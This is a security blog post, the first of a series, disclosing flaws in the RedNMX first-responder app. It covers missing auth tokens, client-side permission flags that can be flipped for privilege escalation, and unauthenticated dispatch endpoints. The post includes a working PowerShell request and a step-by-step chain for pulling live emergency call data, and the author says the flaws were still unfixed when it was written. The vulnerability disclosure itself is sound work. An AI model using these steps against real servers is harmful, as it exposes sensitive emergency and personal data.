---
layout: post
title:  "RedNMX Part 1"
description: Security flaws for first responders. Unauthenticated access.
date:   2025-1-15 23:00:00 -0500
categories: Security 
excerpt: How a simple project to get mobile application data onto my computer resulted in the discovery of multiple severe security flaws in an app used by first responders across the country. 
---


# Background
I am going to break this post down into a few seperate parts. First, I'd like to give some background to what inspired this project. I have been a volunteer firefighter in my town for a few years now, and as result of that, I have access to a mobile app called <b>RedNMX</b> that lets me view information related to fire department activity in my town. This information can pertain to active alarms, dispatch notes, fire hydrant locations, etc. When a call comes in, we get a push notification to this mobile app with information relevant to the alarm so that we can respond. 

This project initially began because I wanted to take this information and have it displayed on my computer. I spend a lot of time on my computer without my phone in near reach, so getting these notifications on my computer would have been great! Unfortunately for me, the company who creates this app, Alpine Software, does not have a publicly available desktop app. So with no simple solution in sight, I figured I would go ahead and reverse engineer the mobile application and find out how it's retrieving this information. Little did I know just what a security nightmare I would discover. 
<br>
<br>

# Initial Findings
The first thing I began doing was looking to capture the web traffic from the mobile application, this way I could see what API calls were being made to login to the service, and what the workflow was going to be to replicate the login on my computer. I have done similar things are work when developing Powershell modules to interact with external platforms, so I wasn't too worried. In this case I went ahead and setup an Android emulator on my PC, installed [HTTP proxy](https://httptoolkit.com/), installed the app, and began sniffing the login traffic. The first screen we will come across when launching the application is a registration portal which simply takes in a registration code to point you at your departments RedNMX instance.

![RegistrationPage](/assets/images/RedNMX/registration_portal.png)

If we go ahead and enter a valid registration code we can see that this endpoint (/frds/sec.register.php) is simply a directory service for identifying what hosted server you should be querying for your account and other relevant information. Interestingly, the <b>frdsappserver</b> value is simply a subdomain of the <b>rednmx.cloud</b> domain that signifies the fire department in question. This is intersting since in theory we could easily guess the DNS name of other departments and thus identify where their server instances are running, but we will come back to this. 

![RegistrationResponse](/assets/images/RedNMX/Registration_Proxy_data.png)

That being said, at this point, the application will dump you to a login page for your specific RedNMX instance. Entering a username and password combination we can look at the requests format so we can reproduce it in our own application. This is where things began to seem off, take a look at the response data and see if you can tell what might be a problem. I've included the redacted data in a code tag below for easier viewing.

![LoginPage](/assets/images/RedNMX/LoginPage.png)

![LoginRequestProxy](/assets/images/RedNMX/Login_proxy_data.png)

```json
{
  "login": {
    "status": "OK",
    "descr": "Ok",
    "data": {
      "persid": "0",
      "perscode": "0",
      "lname": "REDACTED",
      "fname": "DAVID",
      "fdid": "00000",
      "respsoundalarm": "",
      "respsoundmsg": "",
      "alertsonlyversion": "N",
      "responderselfonly": "",
      "respondernodisphist": "",
      "paging": "N",
      "paginghistory": "N",
      "bulletins": "Y",
      "workorders": "N",
      "woview": "N",
      "woadd": "N",
      "woedit": "N",
      "woclose": "N",
      "noninc": "N",
      "imageinc": "Y",
      "imageprop": "Y",
      "imageview": "N",
      "imageedit": "N",
      "imagedel": "N",
      "nfirsview": "N",
      "nfirsedit": "N",
      "nfirseditpasttime": "N",
      "nfirseditapproved": "N",
      "truckinsp": "Y",
      "appview": "N",
      "appadd": "N",
      "appedit": "N",
      "scbainsp": "Y",
      "scbaview": "N",
      "scbaadd": "N",
      "scbaedit": "N",
      "geninvinsp": "Y",
      "stationinsp": "Y",
      "invview": "N",
      "invadd": "N",
      "invedit": "N",
      "hoseinsp": "Y",
      "hoseview": "N",
      "hoseadd": "N",
      "hoseedit": "N",
      "deptdocs": "Y",
      "docsview": "N",
      "docsedit": "N",
      "docsdel": "N",
      "mysched": "N",
      "schdcal": "N",
      "schdadd": "N",
      "schded": "N",
      "schdedlock": "N",
      "schdreqadd": "N",
      "schdreqed": "N",
      "schdreqmaxdays": "",
      "schdavailshift": "N",
      "schdhidedept": "N",
      "propimage": "N",
      "propview": "N",
      "propedit": "N",
      "propsetup": "N",
      "allownocallresponses": "N",
      "allowdefaultresponse": "N",
      "mydefaultresponse": "",
      "mydefaultresponsecode": "",
      "mydefaultresponsedescr": "",
      "responderstatus": "N",
      "respcustsound": "N",
      "wogeninvsearch": "N",
      "sysmoduleset": [
        {
          "FDID": "00000",
          "SYSMODULESETID": "1",
          "MODCODE": "APP"
        },
        {
          "FDID": "00000",
          "SYSMODULESETID": "2",
          "MODCODE": "CADINT"
        },
        {
          "FDID": "00000",
          "SYSMODULESETID": "3",
          "MODCODE": "DISP"
        },
        ... (continued for many non-relevant sysmodules)
      ],
      "sec": null,
      "deptname": "REDACTED"
    },
    "fdidlist": [
      {
        "fdid": "00000",
        "pushchannel": "fdid_00000_00000",
        "deptname": "REDACTED",
        "nopush": "",
        "channels": null,
        "nocalls": ""
      }
    ]
  }
}
```

I know, I know, I just threw a lot of data at you. Just from logging in we instantly query multiple different API endpoints, and we get a pretty big JSON formatted response from the server. If you've looked through this response from the server you may notice something is missing.... any kind of auth token! For some reason, this application doesn't grant the logged in user any auth token to identify themself or perform any server side check on what you should be doing. Looking at the returned data, we can see nested within the <b>data</b> tag is a long list of <b>Y/N</b> permissions, and believe it or not, we can simply capture the login traffic, modify all the N's to Y's and get full privilege escalation within the application! So with my worries about having to deal with getting a valid session token on my desktop app gone, I started to think.... "If there's no session token, does it really matter if I even sign in?". Well, lets go ahead and take a closer look at some of those API endpoints the application reached out to when we first signed in, as well as other endpoints it reaches out to when navigating around the app.



# Unauthenticated Access
To start this section off, lets look at one of the last endpoints the application reaches out to when you login, <b>/dispcall.json.php</b>.

![dispcall.json.php](/assets/images/RedNMX/dispcall_proxy_data.png)

To give you some background on what this endpoint is referencing, it is used to query for any open alarms within the district which would be displayed on the below screen of the app:

![dispcall_page](/assets/images/RedNMX/dispcall_page.png)

 If we look below we can see that we provide the following data to the endpoint in the request body in order to receive back a json object referencing the active alarms:

```
persid
fdid
open
```

Interesting, there seems to be no sign of an auth token in the header of the request or anything to validate the user should be allowed to query this data. The only thing that even ties this request to a user if the persid parameter that WE provide. Hmmm, I wonder if we can query this with a random persid? Lets go ahead and throw some powershell together quick to reproduce this request, and while we're at it, lets enter a random persid.

The below PowerShell code (with personal info removed) will go ahead and spit out the data shown:

```powershell
$hostname = "XXXX.rednmx.cloud:8866"
$endpoint = "/dispcall.json/php"
Invoke-RestMethod -Uri ($hostname + $endpoint) -Method POST -Body @{persid=1;fdid=00000;open=1}
```

```json
{
    "dispcall":  [
                     {
                         "dispcallid":  "59402",
                         "nfirsmainid":  "00000",
                         "fdid":  "00000",
                         "incnum":  "2025000111",
                         "datetimealarm":  "01/14/2025 22:05:00",
                         "plastname":  "",
                         "propid":  "9202",
                         "incstat":  "OPEN",
                         "address":  "1 REDACTED LANE",
                         "strnum":  "1",
                         "street":  "REDACTED",
                         "roomapt":  "",
                         "cross1":  "REDACTED",
                         "cross2":  "",
                         "city":  "REDACTED",
                         "state":  "NY",
                         "zip":  "00000-",
                         "sitename":  "",
                         "dispboxcode":  "000",
                         "icon":  "EMS",
                         "abbreviate":  "XXX",
                         "dispcalltypecode":  "16",
                         "dispcalltypedescr":  "16 - Ambulance Call",
                         "dispsubtypedescr":  "Breathing/Respiratory Problem",
                         "latitude":  "0",
                         "longitude":  "0",
                         "expired":  "N",
                         "deptname":  "REDACTED",
                         "nfirsatt":  null
                     }
                 ]
}
```

And just like that we have queried and pulled data from these endpoints without authenticating at all! There is one pesky problem with this endpoint though, it does want a fdid parameter to identify the fire department to look for. That data is given to us in the initial registration and login, but how would we get that without a valid account? Well lucky us, there's another endpoint <b>/disphist.json.php</b> that can give us just that information! In practical use, this endpoint is meant to be used to view the details about a specific call. Providing this endpoint a <b>nfirsmainid</b> and a <b>dispcallid</b> will get us back the call address, nature of the call, units activity, dispatch notes and most importantly, the <b>fdid</b>! Now you might wonder how will we know what values to pass to this endpoint? I'm glad you asked; we can simply pass a few arbitrary numbers such as 1, 1000, 4000, etc. until we hit a valid result. In practice this took 2 attempts as I tried 1 and 1000. See below for the heavily redacted output from hitting this endpoint:


```json
[
    {
        "IPADDRESS":  "",
        "DISPCALLID":  "1000",
        "DATETIMESTAT":  "02/19/2009 13:39:43",
        "ADDRESS":  "REDACTED",
        "DISPHISTID":  "10990",
        "NARR":  "",
        "MOBUNIT":  "",
        "MOBALL":  "",
        "DISPSTATCODEID":  "13",
        "UNITNUM":  "",
        "DISPSTATCODEDESCR":  "End of Alarm",
        "SORTORD":  "0",
        "NFIRSMAINID":  "0",
        "FDID":  "",
        "SECID":  "0",
        "DISPSTATCODECODE":  "EOA",
        "SOURCE":  "",
        "DISPAPPID":  "0",
        "OPENKIOSK":  "",
        "CLOSEKIOSK":  "",
        "KIOSKSTATCODETIMEOUT":  "0"
    },
    {
        "IPADDRESS":  "",
        "DISPCALLID":  "1000",
        "DATETIMESTAT":  "02/19/2009 13:39:40",
        "ADDRESS":  "REDACTED",
        "DISPHISTID":  "10989",
        "NARR":  "",
        "MOBUNIT":  "Y",
        "MOBALL":  "Y",
        "DISPSTATCODEID":  "6",
        "UNITNUM":  "VEHICLE_IDENTIFIER",
        "DISPSTATCODEDESCR":  "In Service",
        "SORTORD":  "7",
        "NFIRSMAINID":  "111",
        "FDID":  "00000",
        "SECID":  "0",
        "DISPSTATCODECODE":  "28",
        "SOURCE":  "",
        "DISPAPPID":  "9",
        "OPENKIOSK":  "",
        "CLOSEKIOSK":  "",
        "KIOSKSTATCODETIMEOUT":  "0"
    },
    {
        "IPADDRESS":  "",
        "DISPCALLID":  "1000",
        "DATETIMESTAT":  "02/19/2009 13:34:44",
        "ADDRESS":  "REDACTED",
        "DISPHISTID":  "10988",
        "NARR":  "",
        "MOBUNIT":  "Y",
        "MOBALL":  "Y",
        "DISPSTATCODEID":  "5",
        "UNITNUM":  "VEHICLE_IDENTIFIER",
        "DISPSTATCODEDESCR":  "Return to Station",
        "SORTORD":  "6",
        "NFIRSMAINID":  "111",
        "FDID":  "00000",
        "SECID":  "0",
        "DISPSTATCODECODE":  "5",
        "SOURCE":  "",
        "DISPAPPID":  "9",
        "OPENKIOSK":  "",
        "CLOSEKIOSK":  "",
        "KIOSKSTATCODETIMEOUT":  "0"
    },
    {
        "IPADDRESS":  "",
        "DISPCALLID":  "1000",
        "DATETIMESTAT":  "02/19/2009 13:22:52",
        "ADDRESS":  "REDACTED",
        "DISPHISTID":  "10987",
        "NARR":  "",
        "MOBUNIT":  "Y",
        "MOBALL":  "Y",
        "DISPSTATCODEID":  "4",
        "UNITNUM":  "VEHICLE_IDENTIFIER",
        "DISPSTATCODEDESCR":  "At Hospital",
        "SORTORD":  "5",
        "NFIRSMAINID":  "111",
        "FDID":  "00000",
        "SECID":  "0",
        "DISPSTATCODECODE":  "21-6",
        "SOURCE":  "",
        "DISPAPPID":  "9",
        "OPENKIOSK":  "",
        "CLOSEKIOSK":  "",
        "KIOSKSTATCODETIMEOUT":  "0"
    },
    {
        "IPADDRESS":  "",
        "DISPCALLID":  "1000",
        "DATETIMESTAT":  "02/19/2009 13:21:43",
        "ADDRESS":  "REDACTED",
        "DISPHISTID":  "10986",
        "NARR":  "",
        "MOBUNIT":  "Y",
        "MOBALL":  "Y",
        "DISPSTATCODEID":  "3",
        "UNITNUM":  "VEHICLE_IDENTIFIER",
        "DISPSTATCODEDESCR":  "Enroute to Hospital",
        "SORTORD":  "4",
        "NFIRSMAINID":  "111",
        "FDID":  "00000",
        "SECID":  "0",
        "DISPSTATCODECODE":  "18",
        "SOURCE":  "",
        "DISPAPPID":  "9",
        "OPENKIOSK":  "",
        "CLOSEKIOSK":  "",
        "KIOSKSTATCODETIMEOUT":  "0"
    },
    {
        "IPADDRESS":  "",
        "DISPCALLID":  "1000",
        "DATETIMESTAT":  "02/19/2009 13:15:48",
        "ADDRESS":  "REDACTED",
        "DISPHISTID":  "10985",
        "NARR":  "",
        "MOBUNIT":  "Y",
        "MOBALL":  "Y",
        "DISPSTATCODEID":  "2",
        "UNITNUM":  "VEHICLE_IDENTIFIER",
        "DISPSTATCODEDESCR":  "On Scene",
        "SORTORD":  "3",
        "NFIRSMAINID":  "111",
        "FDID":  "00000",
        "SECID":  "0",
        "DISPSTATCODECODE":  "21",
        "SOURCE":  "",
        "DISPAPPID":  "9",
        "OPENKIOSK":  "",
        "CLOSEKIOSK":  "",
        "KIOSKSTATCODETIMEOUT":  "0"
    },
    {
        "IPADDRESS":  "",
        "DISPCALLID":  "1000",
        "DATETIMESTAT":  "02/19/2009 13:12:13",
        "ADDRESS":  "REDACTED",
        "DISPHISTID":  "10984",
        "NARR":  "",
        "MOBUNIT":  "Y",
        "MOBALL":  "Y",
        "DISPSTATCODEID":  "1",
        "UNITNUM":  "VEHICLE_IDENTIFIER",
        "DISPSTATCODEDESCR":  "Enroute",
        "SORTORD":  "2",
        "NFIRSMAINID":  "111",
        "FDID":  "00000",
        "SECID":  "0",
        "DISPSTATCODECODE":  "2",
        "SOURCE":  "",
        "DISPAPPID":  "9",
        "OPENKIOSK":  "",
        "CLOSEKIOSK":  "",
        "KIOSKSTATCODETIMEOUT":  "0"
    },
    {
        "IPADDRESS":  "",
        "DISPCALLID":  "1000",
        "DATETIMESTAT":  "02/19/2009 13:11:10",
        "ADDRESS":  "REDACTED",
        "DISPHISTID":  "10982",
        "NARR":  "Generated 2009-000293 for REDACTED",
        "MOBUNIT":  "",
        "MOBALL":  "",
        "DISPSTATCODEID":  "7",
        "UNITNUM":  "",
        "DISPSTATCODEDESCR":  "Created NFIRS",
        "SORTORD":  "0",
        "NFIRSMAINID":  "111",
        "FDID":  "",
        "SECID":  "0",
        "DISPSTATCODECODE":  "NFIRS",
        "SOURCE":  "",
        "DISPAPPID":  "0",
        "OPENKIOSK":  "",
        "CLOSEKIOSK":  "",
        "KIOSKSTATCODETIMEOUT":  "0"
    },
    {
        "IPADDRESS":  "",
        "DISPCALLID":  "1000",
        "DATETIMESTAT":  "02/19/2009 13:11:10",
        "ADDRESS":  "REDACTED",
        "DISPHISTID":  "10983",
        "NARR":  "",
        "MOBUNIT":  "",
        "MOBALL":  "",
        "DISPSTATCODEID":  "8",
        "UNITNUM":  "",
        "DISPSTATCODEDESCR":  "Dispatched",
        "SORTORD":  "0",
        "NFIRSMAINID":  "0",
        "FDID":  "",
        "SECID":  "0",
        "DISPSTATCODECODE":  "DISP",
        "SOURCE":  "",
        "DISPAPPID":  "0",
        "OPENKIOSK":  "",
        "CLOSEKIOSK":  "",
        "KIOSKSTATCODETIMEOUT":  "0"
    },
    {
        "IPADDRESS":  "",
        "DISPCALLID":  "1000",
        "DATETIMESTAT":  "02/19/2009 13:10:31",
        "ADDRESS":  "",
        "DISPHISTID":  "10981",
        "NARR":  "",
        "MOBUNIT":  "",
        "MOBALL":  "",
        "DISPSTATCODEID":  "12",
        "UNITNUM":  "",
        "DISPSTATCODEDESCR":  "Received",
        "SORTORD":  "0",
        "NFIRSMAINID":  "0",
        "FDID":  "",
        "SECID":  "0",
        "DISPSTATCODECODE":  "RCVD",
        "SOURCE":  "",
        "DISPAPPID":  "0",
        "OPENKIOSK":  "",
        "CLOSEKIOSK":  "",
        "KIOSKSTATCODETIMEOUT":  "0"
    }
]
```

So if we put all the pieces together now, we could get unauthenticated access to view and modify this applications data without any user credentials by discovering additional subdomains of rednmx.cloud, querying them for a bogus call via the <b>disphistory.json.php</b> endpoint, obtaining a valid fdid, and then listening for all calls, new and old via the <b>dispcall.json.php</b> endpoint! And this is just the "harmless" stuff. There's endpoints for password resets that don't require any information besides a user ID!


# Final Notes
I think this should be a good place to end this post since there is plenty more to cover including dangerous password reset API endpoints, the decompiling of the application, and more! I would like to also note, I have passed along all information posted here to the vendor, Alpine Software, and even got approval from their CTO to make this blog post. At the time of writting, these bugs are still present in the application; however, I have done my best to responsibly disclose this to the vendor and they have not made an effort to get it resolved for one reason or another. 

That all being said, I hope you appreciated the first of the series!